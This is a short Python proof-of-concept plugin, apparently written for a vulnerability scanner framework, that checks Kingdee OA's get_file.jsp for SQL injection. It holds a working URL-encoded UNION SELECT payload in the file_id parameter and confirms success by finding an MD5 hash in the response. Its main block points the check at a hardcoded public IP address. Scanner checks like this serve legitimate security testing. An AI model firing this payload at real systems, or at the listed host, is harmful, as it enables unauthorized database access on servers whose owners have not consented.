#!/usr/bin/env python
# -*- coding: utf-8 -*-
#author:
#Name:金蝶办公系统get_file.jsp SQL注入漏洞

import time

def assign(service, arg):
    if service == "kingdee_oa":
        return True, arg
        
        
def audit(arg):
    payload = 'Kingdee/disk/get_file.jsp?file_id=11%29%20and%201%3D2%20UNION%20SELECT%201%2C2%2C3%2C4%2C5%2C6%2C7%2Csys.fn_varbintohexstr%28hashbytes%28%27MD5%27%2C%271234%27%29%29%2C9%2C10--'
    code,head, res, errcode, _ = curl.curl2(arg + payload)
    if code == 200 and '81dc9bdb52d04dc20036dbd8313ed055' in res:
        security_hole(arg + payload + "  :found sql Injection")


if __name__ == '__main__':
    from dummy import *
    audit(assign('kingdee_oa', 'http://222.134.77.23:8080/')[1])